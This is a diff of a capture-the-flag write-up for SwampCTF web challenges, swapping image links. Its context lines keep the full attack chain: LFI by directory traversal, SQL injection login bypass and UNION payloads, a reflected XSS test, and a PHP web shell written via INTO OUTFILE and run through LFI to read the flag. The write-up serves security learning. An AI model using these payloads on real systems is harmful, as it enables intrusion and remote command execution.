@@ -1,6 +1,6 @@
 #### BrailleDB-1
 
-![[Pasted image 20240407223118.png]]
+![alt text](Attachments/1.png)
 
 Try to input single quote and it gives us an error
 
@@ -56,7 +56,7 @@ And we get the flag
 
 Visit the given web page and in front of us we see
 
-![[Pasted image 20240407223140.png]]
+![alt text](Attachments/2.png)
 
 So there is a page query parameter and it id loading a page based on the name given to it, the first thing that comes to my mind is LFI so lets try adding basic LFI payload, generally the websites are hosted from /var/www/html so we need to go back atleast 3 directories
 
@@ -102,7 +102,7 @@ So there is only one user that is the root user
 
 The hint given to us is that we have to chain 2 vulnerabilities so lets see if we can find another one as well. We can see that there is an option of Admin login lets click on that
 
-![[Pasted image 20240407223618.png]]
+![alt text](Attachments/3.png)
 
 Again the file being loaded using the page parameter and we know we have LFI
 Lets try SQL injection on the login form
@@ -114,7 +114,7 @@ password: randomData
 
 And we get login successful
 
-![[Pasted image 20240407223818.png]]
+![alt text](Attachments/4.png)
 
 We can also see that whatever we type is being reflected back so we may also have reflected XSS, we can try that too
 
@@ -125,7 +125,7 @@ password : asdf
 
 And we get a pop up
 
-![[Pasted image 20240407224140.png]]
+![alt text](Attachments/5.png)
 
 This is although useless but good to try and find other vulnerabilities as well for practice
 
@@ -140,7 +140,7 @@ password: asdf
 
 It gives back the response
 
-![[Pasted image 20240407224544.png]]
+![alt text](Attachments/6.png)
 
 ```text
 Login failed! Please try again.
@@ -162,7 +162,7 @@ a' or 1=1 union select 1,2,3 from information_schema.tables-- -
 
 And we get a successful login
 
-![[Pasted image 20240407224736.png]]
+![alt text](Attachments/7.png)
 
 ```asciidoc
 Login successful! Welcome back, a' or 1=1 union select 1,2,3 from information_schema.tables-- -!
@@ -200,7 +200,7 @@ Here is what our SQL query will look like
 ' union select null,null,"<?php system($_GET['cmd']);?>" into outfile "/tmp/command.php"-- -
 ```
 
-![[Pasted image 20240407232425.png]]
+![alt text](Attachments/8.png)
 
 We will get a login failed but that doesnt matter
 Now all we have to do is open this file using LFI and add query parameter `cmd` to the request, this is how our request will look like
@@ -209,11 +209,11 @@ Now all we have to do is open this file using LFI and add query parameter `cmd` 
 http://chals.swampctf.com:60310/?page=../../../tmp/command.php&cmd=id
 ```
 
-![[Pasted image 20240407232503.png]]
+![alt text](Attachments/9.png)
 
 We pass `ls` to command parameter and find out that the name of file is `super_secret_flag_plz_no_read.txt`
 
-![[Pasted image 20240407232545.png]]
+![alt text](Attachments/10.png)
 
 Lets do
 
@@ -223,7 +223,7 @@ http://chals.swampctf.com:60310/?page=../../../tmp/command.php&cmd=cat%20%20supe
 
 And we get the flag
 
-![[Pasted image 20240407232639.png]]
+![alt text](Attachments/11.png)
 
 **_flag : swampCTF{ch4ining_Vu1ns_I5_Pr3tty_C0Ol}_**
 
